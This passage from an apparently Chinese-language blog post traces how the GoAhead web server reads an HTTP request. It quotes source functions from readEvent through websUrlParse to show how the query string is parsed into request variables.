</span><span style="color:#c0c5ce;">[#5] 0x7b67396c55f5 &lt;socketDoEvent+0xd2&gt;
</span><span style="color:#c0c5ce;">[#6] 0x7b67396c550d &lt;socketProcess+0x59&gt;
</span><span style="color:#c0c5ce;">[#7] 0x7b67396b087c &lt;websServiceEvents+0x47&gt;
</span><span style="color:#c0c5ce;">[#8] 0x62e0eac32a3f &lt;main+0x5b6&gt;
</span></pre>
<p>从<code>readEvent</code>开始看
根据<code>Webs</code>结构体定义<code>rxbuf</code>存储原始请求数据。下面代码调用<code>websRead</code>获取输入存储到<code>rxbuf</code>中
<code>websRead</code>内部使用<code>sslRead</code>或<code>socketRead</code>获取数据</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">    The webs read handler. This is the primary read event loop. It uses a state machine to track progress while parsing
</span><span style="color:#65737e;">    the HTTP request.  Note: we never block as the socket is always in non-blocking mode.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">readEvent</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    WebsBuf     *rxbuf;
</span><span style="color:#c0c5ce;">    WebsSocket  *sp;
</span><span style="color:#c0c5ce;">    ssize       nbytes;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">    rxbuf = &amp;wp-&gt;rxbuf;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((nbytes = </span><span style="color:#8fa1b3;">websRead</span><span style="color:#c0c5ce;">(wp, (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*) rxbuf-&gt;endp, ME_GOAHEAD_LIMIT_BUFFER)) &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        wp-&gt;lastRead = nbytes;
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">bufAdjustEnd</span><span style="color:#c0c5ce;">(rxbuf, nbytes);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">bufAddNull</span><span style="color:#c0c5ce;">(rxbuf);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(nbytes &gt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| wp-&gt;state &gt; WEBS_BEGIN) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">websPump</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>WebsBuf</code>结构如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/************************************* Ringq **********************************/
</span><span style="color:#65737e;">/**
</span><span style="color:#65737e;">    A WebsBuf (ring queue) allows maximum utilization of memory for data storage and is ideal for input/output buffering.
</span><span style="color:#65737e;">    @description
</span><span style="color:#65737e;">    This module provides a highly efficient implementation and a vehicle for dynamic strings.
</span><span style="color:#65737e;">    WARNING: This is a public implementation and callers have full access to
</span><span style="color:#65737e;">    the queue structure and pointers. Change this module very carefully.
</span><span style="color:#65737e;">    \n\n
</span><span style="color:#65737e;">    This module follows the open/close model.
</span><span style="color:#65737e;">    \n\n
</span><span style="color:#65737e;">    Operation of a WebsBuf where bp is a pointer to a WebsBuf :
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        bp-&gt;buflen contains the size of the buffer.
</span><span style="color:#65737e;">        bp-&gt;buf will point to the start of the buffer.
</span><span style="color:#65737e;">        bp-&gt;servp will point to the first (un-consumed) data byte.
</span><span style="color:#65737e;">        bp-&gt;endp will point to the next free location to which new data is added
</span><span style="color:#65737e;">        bp-&gt;endbuf will point to one past the end of the buffer.
</span><span style="color:#65737e;">    \n\n
</span><span style="color:#65737e;">    Eg. If the WebsBuf contains the data &quot;abcdef&quot;, it might look like :
</span><span style="color:#65737e;">    \n\n
</span><span style="color:#65737e;">    +-------------------------------------------------------------------+
</span><span style="color:#65737e;">    |   |   |   |   |   |   |   | a | b | c | d | e | f |   |   |   |   |
</span><span style="color:#65737e;">    +-------------------------------------------------------------------+
</span><span style="color:#65737e;">      ^                           ^                       ^               ^
</span><span style="color:#65737e;">      |                           |                       |               |
</span><span style="color:#65737e;">    bp-&gt;buf                    bp-&gt;servp               bp-&gt;endp      bp-&gt;enduf
</span><span style="color:#65737e;">    \n\n
</span><span style="color:#65737e;">    The queue is empty when servp == endp.  This means that the queue will hold
</span><span style="color:#65737e;">    at most bp-&gt;buflen -1 bytes.  It is the fillers responsibility to ensure
</span><span style="color:#65737e;">    the WebsBuf is never filled such that servp == endp.
</span><span style="color:#65737e;">    \n\n
</span><span style="color:#65737e;">    It is the fillers responsibility to &quot;wrap&quot; the endp back to point to
</span><span style="color:#65737e;">    bp-&gt;buf when the pointer steps past the end. Correspondingly it is the
</span><span style="color:#65737e;">    consumers responsibility to &quot;wrap&quot; the servp when it steps to bp-&gt;endbuf.
</span><span style="color:#65737e;">    The bufPutc and bufGetc routines will do this automatically.
</span><span style="color:#65737e;">    @defgroup WebsBuf WebsBuf
</span><span style="color:#65737e;">    @stability Stable
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">typedef struct</span><span style="color:#c0c5ce;"> WebsBuf {
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char    </span><span style="color:#c0c5ce;">*buf;               </span><span style="color:#65737e;">/**&lt; Holding buffer for data */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char    </span><span style="color:#c0c5ce;">*servp;             </span><span style="color:#65737e;">/**&lt; Pointer to start of data */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char    </span><span style="color:#c0c5ce;">*endp;              </span><span style="color:#65737e;">/**&lt; Pointer to end of data */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char    </span><span style="color:#c0c5ce;">*endbuf;            </span><span style="color:#65737e;">/**&lt; Pointer to end of buffer */
</span><span style="color:#c0c5ce;">    ssize   buflen;             </span><span style="color:#65737e;">/**&lt; Length of ring queue */
</span><span style="color:#c0c5ce;">    ssize   maxsize;            </span><span style="color:#65737e;">/**&lt; Maximum size */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">     increment;          </span><span style="color:#65737e;">/**&lt; Growth increment */
</span><span style="color:#c0c5ce;">} WebsBuf;
</span></pre>
<p>数据存储到<code>wp-&gt;rxbuf</code>中后，进入<code>websPump</code>函数
这是一个分步的处理函数，根据<code>wp-&gt;state</code>的状态来处理
<code>wp-&gt;state</code>一开始是<code>WEBS_BEGIN</code>，程序调用<code>parseIncoming</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">websPump</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;">    canProceed;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(canProceed = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">; canProceed; ) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(wp-&gt;state) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> WEBS_BEGIN:
</span><span style="color:#c0c5ce;">            canProceed = </span><span style="color:#8fa1b3;">parseIncoming</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> WEBS_CONTENT:
</span><span style="color:#c0c5ce;">            canProceed = </span><span style="color:#8fa1b3;">processContent</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> WEBS_READY:
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">websRunRequest</span><span style="color:#c0c5ce;">(wp)) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#65737e;">/* Reroute if the handler re-wrote the request */
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">websRouteRequest</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">                wp-&gt;state = WEBS_READY;
</span><span style="color:#c0c5ce;">                canProceed = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            canProceed = (wp-&gt;state != WEBS_RUNNING);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> WEBS_RUNNING:
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">/* Nothing to do until websDone is called */
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> WEBS_COMPLETE:
</span><span style="color:#c0c5ce;">            canProceed = </span><span style="color:#8fa1b3;">complete</span><span style="color:#c0c5ce;">(wp, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>parseFirstLine()</code>函数处理请求第一行，其中会通过<code>getToken()</code>获取请求方法和<code>url</code>
然后将<code>url</code>传入<code>websUrlParse</code>处理，其中会将<code>url</code>里<code>?xxxx</code>中<code>?</code>之后的东西存到变量<code>query</code>中</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static bool </span><span style="color:#8fa1b3;">parseIncoming</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    WebsBuf     *rxbuf;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char        </span><span style="color:#c0c5ce;">*end, c;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Parse the first line of the Http header
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">parseFirstLine</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;state == WEBS_COMPLETE) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">parseHeaders</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;state == WEBS_COMPLETE) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    wp-&gt;state = (wp-&gt;rxChunkState || wp-&gt;rxLen &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) ? WEBS_CONTENT : WEBS_READY;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">websRouteRequest</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;state == WEBS_COMPLETE) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ME_GOAHEAD_CGI
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;route &amp;&amp; wp-&gt;route-&gt;handler &amp;&amp; wp-&gt;route-&gt;handler-&gt;service == cgiHandler) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">smatch</span><span style="color:#c0c5ce;">(wp-&gt;method, &quot;</span><span style="color:#a3be8c;">POST</span><span style="color:#c0c5ce;">&quot;)) {
</span><span style="color:#c0c5ce;">            wp-&gt;cgiStdin = </span><span style="color:#8fa1b3;">websGetCgiCommName</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((wp-&gt;cgifd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(wp-&gt;cgiStdin, O_CREAT | O_WRONLY | O_BINARY | O_TRUNC, </span><span style="color:#d08770;">0666</span><span style="color:#c0c5ce;">)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_NOT_FOUND | WEBS_CLOSE, &quot;</span><span style="color:#a3be8c;">Cannot open CGI file</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#b48ead;">#endif
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> !ME_ROM
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">smatch</span><span style="color:#c0c5ce;">(wp-&gt;method, &quot;</span><span style="color:#a3be8c;">PUT</span><span style="color:#c0c5ce;">&quot;)) {
</span><span style="color:#c0c5ce;">        WebsStat    sbuf;
</span><span style="color:#c0c5ce;">        wp-&gt;code = (</span><span style="color:#8fa1b3;">stat</span><span style="color:#c0c5ce;">(wp-&gt;filename, &amp;sbuf) == </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp; sbuf.</span><span style="color:#bf616a;">st_mode </span><span style="color:#c0c5ce;">&amp; S_IFDIR) ? HTTP_CODE_NO_CONTENT : HTTP_CODE_CREATED;
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">wfree</span><span style="color:#c0c5ce;">(wp-&gt;putname);
</span><span style="color:#c0c5ce;">        wp-&gt;putname = </span><span style="color:#8fa1b3;">websTempFile</span><span style="color:#c0c5ce;">(ME_GOAHEAD_PUT_DIR, &quot;</span><span style="color:#a3be8c;">put</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((wp-&gt;putfd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(wp-&gt;putname, O_BINARY | O_WRONLY | O_CREAT | O_BINARY, </span><span style="color:#d08770;">0644</span><span style="color:#c0c5ce;">)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">error</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Cannot create PUT filename </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, wp-&gt;putname);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, &quot;</span><span style="color:#a3be8c;">Cannot create the put URI</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">wfree</span><span style="color:#c0c5ce;">(wp-&gt;putname);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">    Parse the first line of a HTTP request
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">parseFirstLine</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char    </span><span style="color:#c0c5ce;">*op, *protoVer, *url, *host, *query, *path, *port, *ext, *buf;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">     listenPort;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Determine the request type: GET, HEAD or POST
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    op = </span><span style="color:#8fa1b3;">getToken</span><span style="color:#c0c5ce;">(wp, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(op == </span><span style="color:#d08770;">NULL </span><span style="color:#c0c5ce;">|| *op == &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_NOT_FOUND | WEBS_CLOSE, &quot;</span><span style="color:#a3be8c;">Bad HTTP request</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    wp-&gt;method = </span><span style="color:#8fa1b3;">supper</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">sclone</span><span style="color:#c0c5ce;">(op));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    url = </span><span style="color:#8fa1b3;">getToken</span><span style="color:#c0c5ce;">(wp, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(url == </span><span style="color:#d08770;">NULL </span><span style="color:#c0c5ce;">|| *url == &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_BAD_REQUEST | WEBS_CLOSE, &quot;</span><span style="color:#a3be8c;">Bad HTTP request</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(url) &gt; ME_GOAHEAD_LIMIT_URI) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_REQUEST_URL_TOO_LARGE | WEBS_CLOSE, &quot;</span><span style="color:#a3be8c;">URI too big</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    protoVer = </span><span style="color:#8fa1b3;">getToken</span><span style="color:#c0c5ce;">(wp, &quot;</span><span style="color:#96b5b4;">\r\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">websGetLogLevel</span><span style="color:#c0c5ce;">() == </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#d08770;">%s %s %s</span><span style="color:#c0c5ce;">&quot;, wp-&gt;method, url, protoVer);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Parse the URL and store all the various URL components. websUrlParse returns an allocated buffer in buf which we
</span><span style="color:#65737e;">        must free. We support both proxied and non-proxied requests. Proxied requests will have http://host/ at the
</span><span style="color:#65737e;">        must free. We support both proxied and non-proxied requests. Proxied requests will have http://host/ at the
</span><span style="color:#65737e;">        start of the URL. Non-proxied will just be local path names.
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    host = path = port = query = ext = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">websUrlParse</span><span style="color:#c0c5ce;">(url, &amp;buf, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, &amp;host, &amp;port, &amp;path, &amp;ext, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, &amp;query) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">error</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Cannot parse URL: </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, url);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_BAD_REQUEST | WEBS_CLOSE | WEBS_NOLOG, &quot;</span><span style="color:#a3be8c;">Bad URL</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    wp-&gt;query = </span><span style="color:#8fa1b3;">sclone</span><span style="color:#c0c5ce;">(query);
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">wfree</span><span style="color:#c0c5ce;">(buf);
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">    Parse the URL. A single buffer is allocated to store the parsed URL in *pbuf. This must be freed by the caller.
</span><span style="color:#65737e;"> */
</span><span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">websUrlParse</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">url</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">pbuf</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">pscheme</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">phost</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">pport</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">ppath</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">pext</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">preference</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">pquery</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char    </span><span style="color:#c0c5ce;">*tok, *delim, *host, *path, *port, *scheme, *reference, *query, *ext, *buf, *buf2;
</span><span style="color:#c0c5ce;">    ssize   buflen, ulen, len;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">     sep;
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        [scheme://][hostname[:port]][/path[.ext]][#ref][?query]
</span><span style="color:#65737e;">        First trim query and then reference from the end
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((query = </span><span style="color:#96b5b4;">strchr</span><span style="color:#c0c5ce;">(tok, &#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;)) != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        *query++ = &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(pquery) {
</span><span style="color:#c0c5ce;">        *pquery = query;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>处理结束便将请求中<code>?</code>之后的内容存储于<code>wp-&gt;query</code>中
并设置<code>state</code>为<code>WEBS_CONTENT</code>或<code>WEBS_READY</code>
（这里如果通过<code>POST</code>传了<code>body</code>上去，会根据<code>content-length</code>设置<code>wp-&gt;rxLen</code>，则会设置<code>WEBS_CONTENT</code>调用<code>processContent()</code>处理内容，如果<code>GET</code>不传<code>body</code>则设置<code>WEBS_READY</code>。<code>WEBS_CONTENT</code>最终也会设置为<code>WEBS_READY</code>）</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">// src/http.c:parseIncoming()
</span><span style="color:#c0c5ce;">wp-&gt;state = (wp-&gt;rxChunkState || wp-&gt;rxLen &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) ? WEBS_CONTENT : WEBS_READY;
</span></pre>
<p>之后状态转换为<code>WEBS_READY</code>，调用<code>websRunRequest(wp)</code>
这里不管是<code>websSetQueryVars</code>还是<code>websSetFormVars</code>最终都会调用<code>addFormVars(wp, data);</code>添加变量</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">bool </span><span style="color:#8fa1b3;">websRunRequest</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!(wp-&gt;flags &amp; WEBS_VARS_ADDED)) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;query &amp;&amp; *wp-&gt;query) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websSetQueryVars</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;flags &amp; WEBS_FORM) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websSetFormVars</span><span style="color:#c0c5ce;">(wp);
